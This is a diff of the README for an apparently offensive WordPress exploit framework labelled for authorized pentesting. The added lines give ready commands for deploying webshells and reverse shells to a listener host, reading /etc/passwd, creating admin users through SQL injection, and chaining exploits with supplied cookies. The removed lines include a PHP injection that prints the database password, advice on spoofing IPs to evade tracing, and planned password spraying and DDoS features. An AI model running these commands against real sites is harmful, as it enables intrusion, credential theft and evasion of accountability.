@@ -1,181 +1,108 @@
-# HackWP
+# HWP — HackWP Framework
 
-## Dev branch
+[![Version](https://img.shields.io/github/v/tag/etragardh/hackwp?label=version&color=cyan)](https://github.com/etragardh/hackwp/releases)
+[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://python.org)
+[![License](https://img.shields.io/badge/use-authorized%20testing%20only-red)](https://github.com/etragardh/hackwp)
+[![HackWP](https://img.shields.io/badge/hackwp.io-API-orange)](https://hackwp.io)
 
-This is a tool Im using to offload heavy work from WP pentesting.<br />
-IE for me to re use payloads, use stolen cookies, spoof IPs and UAs etc.<br />
-<br />
-The main idea with open sourceing this is to release a tool that combines the best from `wpscan` and `msf` to be used by pentesters, webmasters and sysadmins to test their own sites, equipment and infrastructure.
+WordPress exploit framework for authorized pentesting and security training.
 
-I will probably opensource most of my exploits with time but it is very welcome if the community would add their own. Create a pull request and I will add it if it is nice.
+## Installation
 
->[!CAUTION]
-> Be careful when using HackWP.<br />
-> This is an agressive tool that presumes you are the admin/owner of the site you are pentesting.
-> If you don't have the option to white list your IP in your firewall you can use a VPN. Proxies are currently not supported :/
-
-## Usage
-
-**Installation**
-
-```
+```bash
 gh repo clone etragardh/hackwp
-chmod +x hackwp/hackwp
-sudo ln -s ${PWD}/hackwp/hackwp /usr/local/bin
+cd hackwp
+chmod +x hwp.py
+sudo ln -s ${PWD}/hwp.py /usr/local/bin/hwp
 ```
 
-**Update**
+Install dependencies:
 
-```
-cd /path/to/hackwp/
-git pull
-```
-
-**Sample Scan**
-```
-hackwp --scan --target http://localhost --spoof
-hackwp --scan --target http://localhost --spoof --verbose <- more info
-hackwp --scan --target http://localhost --spoof --debug <- most info
+```bash
+pip install packaging requests rich textual httpx
 ```
 
-**Sample hacks**
+## Quick Start
 
-Test payload
-```
-hackwp --target http://localhost --attack bricks --exploit 1.9.6-rce --payload test-rce --spoof --debug
-```
-Test payload with manual PHP
-```
-hackwp --target http://localhost --attack bricks --exploit 1.9.6-rce --payload test-rce "<?php echo DB_PASSWORD; ?>"  --spoof --debug
-```
+```bash
+# Interactive mode (default — just run it)
+hwp
 
-**What commands to run**
+# Run an exploit with a payload
+hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "whoami"
 
-HackWP will tell you what commands are available after the scan is complete. It will tell you what exploits will work with the scanned site and give you a command to copy/paste.
+# Deploy a webshell
+hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload webshell
 
-You can also list available exploits and payloads like this.<br />
-+TODO: List command is not implemented since there are only a few options
-```
-hackwp --list <exploits|payloads> <method|surface|author>
-hackwp --list exploits <- all exploits
-hackwp --list exploits rce <- exploits that has RCE
-hackwp --list exploits bricks <- exploits that affects bricks surface
-hackwp --list payloads <- all payloads
-```
+# Upload webshell via file upload vulnerability
+hwp -t http://target.com --exploit hwp-training/1.0.0-afu --payload webshell
 
-## Roadmap
-+ Interesing findings<br />
-+ Password spray on enumerated users<br />
-+ Stess test reflected DDoS<br />
-+ Stess test amplified Dos/DDoS<br />
-+ Better error handling<br />
-+ Performance and memory management<br />
-+ Documentation<br />
-+ Auto test any input for reflected XSS<br />
-+ Enumerate emails<br />
-+ Enumerate gravatar hashes<br />
-+ Scanner/User should return userObject with:<br />
- -> email<br />
- -> gravatar hash<br />
- -> user id<br />
-+ Check gravatar against public rainbow tables<br />
- -> Make the api/url optionable<br />
+# Deploy via RFI (payload has hosted URL — no server needed)
+hwp -t http://target.com --exploit hwp-training/1.0.0-rfi --payload webshell
 
-## Issues
-+ Update WP Core version regex. (ie v 5.9.10 will show as 5.9.1)
-+ Remove message "--Vulnerable to:" for plugins and themes vuln (either just display it once or not at all)
-+ False positives on plugins/theme version when WP Core version is used as ?v=6.5.5 on plugin files.
+# Deploy via RFI with server fallback (payload has no hosted URL)
+hwp -t http://target.com --exploit hwp-training/1.0.0-rfi --payload revshell --lhost 10.0.0.5 --lport 8888
 
-## Documentation
-[Documentation](https://github.com/etragardh/hackwp/tree/main/docs/)
-[Create Exploit](https://github.com/etragardh/hackwp/tree/main/docs/exploit/)
-[Create Payload](https://github.com/etragardh/hackwp/tree/main/docs/payload)
+# Reverse shell
+hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload revshell --lhost 10.0.0.5
 
-## Dependencies
+# Read a file
+hwp -t http://target.com --exploit hwp-training/1.0.0-lfi --payload file_read --file /etc/passwd
 
-+TODO: Update list of deps<br />
-+TODO: Auto install deps with pip if available<br />
+# Create admin user via SQL injection
+hwp -t http://target.com --exploit hwp-training/1.0.0-sqlinj --payload admin_user
 
-## Performance
-+TODO: add support for multi threading<br />
-(To many, to quick, live requests might get you banned, but handling cached scans can increase performance a lot if multi threaded)<br />
-+TODO: Memory management.<br />
-(Go through the code and make sure file pointers are closed, files/content released from memory when not used etc)<br />
-+TODO: Limit the amount of requests when crawling the local site.<br />
-(A large site with thousands of pages takes a long time to scan)
-
-## Stealth
-
-**Spoofing**
-You can have HackWP spoof your IP.
-That will trick most of the Wordpress "get true IP" functions but it will not trick the Police, FBI or other authority that wants to know who you are.
-
-```
-hackwp --scan --target http://localhost --spoof <- spoof IP and UA
-hackwp --scan --target http://localhost --spoof-ip <- spoof IP only 
-hackwp --scan --target http://localhost --spoof-ua <- spoof UA only
+# Scan target
+hwp -t http://target.com --scan
 ```
 
-**Proxy**
-+TODO: Add proxy support for some thing like this:<br />
-[Proxyrack](https://www.proxyrack.com/)
-This means every request can have a unique IP and it is not needed to spoof it.
+## Exploit Chaining
 
-**VPN**
-You can connect your computer to a VPN and then run HackWP. The connection will go through your VPN provider.
+```bash
+# Auth chain: create session, then use authenticated exploit
+hwp -t http://target.com --exploit hwp-training/1.0.0-auth hwp-training/1.0.0-rce --payload bash --cmd "id"
 
-**TOR**
-+TODO: Add support for Onion Routing so requests can have unique IPs andprevent trace backwards.
+# Object injection with POP chain
+hwp -t http://target.com --exploit hwp-training/1.0.0-objinj hwp-training/1.0.0-pop-rce --payload php --code "phpinfo();"
 
-## Supported/tested platforms
-Im running MacOS, Kali and Parrot on my laptop.
-These are the tested systems and there should be very few compatibility issues.
+# Provide cookie directly
+hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "id" --cookie "wordpress_logged_in=abc"
 
-However hackwp is written in python and should run fine on most linux.
-Let me know if it does not run on any of these and I will try to fix it.
-
-+ macos (tested)
-+ kali (tested)
-+ parrot (tested)
-+ ubuntu/debian
-
-**Help**
-CLI Help
-```
-hackwp --help
+# Provide credentials — framework logs in via wp-login.php automatically
+hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "id" --user admin --pass secret
 ```
 
-Help is also available in the blueteamer discord server.
-`https://discord.gg/mNQ66EdJkE`
+## Verbose Output
 
-## Agressive scanning
-HackWP is pretty agressive in its nature.<br />
-However we have an agressive option that makes the scan truly agressive.
-
-Before using this option, make sure you are behind a VPN, Proxy or that your IP is white listed in the firewall. You might get banned for doing a lot of requests.
-
-```
-hackwp --scan --target http://localhost --agressive
+```bash
+hwp -t ... --exploit ... -v     # Show exploit progress details
+hwp -t ... --exploit ... -vv    # Debug: show raw Result fields
 ```
 
-Will add the following to the scan:<br />
-+ Test all vulnerable plugins one by one
-normally plugins are detected just by scanning the source code
-+ Add cryptographic signatures as an option to WP Core Version scan
-(will yield more requests to files that might be blocked by cloudflare or other external firewall zero trust policies)
+## List Available Modules
 
-## Cache
-
-HackWP has caching. It scans/crawl the entire target webiste once. Then the cache is re used for other tasks.
-If you think the site has changed or that some requests were cached in the wrong state (ie you got banned and have now changed IP) you can purge the cache.
-```
-hackwp --scan --target http://localhost --purge
+```bash
+hwp --list-exploits
+hwp --list-payloads
 ```
 
+## Writing Your Own
 
-## Responsibility and Liability
-This software is provided "as is" and is created for educational and testing purposes only. Do not use it for any illegal activities. I will not be held responsible for any harm caused by utilizing this tool in a way it was not meant to.
+- **[Creating Exploits](docs/creating-exploits.md)** — How to write an exploit module
+- **[Creating Payloads](docs/creating-payloads.md)** — How to write a payload module
+- **[Framework Internals](docs/framework.md)** — Chain resolution, auth flow, output rules
 
+Templates are available at `exploits/template/` and `payloads/template/`.
 
-## Support
-<p><a href="https://www.buymeacoffee.com/etragardh"> <img align="left" src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="etragardh" /></a></p>
+## Session Management
+
+Sessions are stored in `~/.hwp/` and reused across runs:
+
+```bash
+# Clear stored session for a target
+hwp -t target.com --clear-session
+```
+
+## License
+
+Security testing tool by [@etragardh](https://github.com/etragardh). For authorized pentest and security testing only.
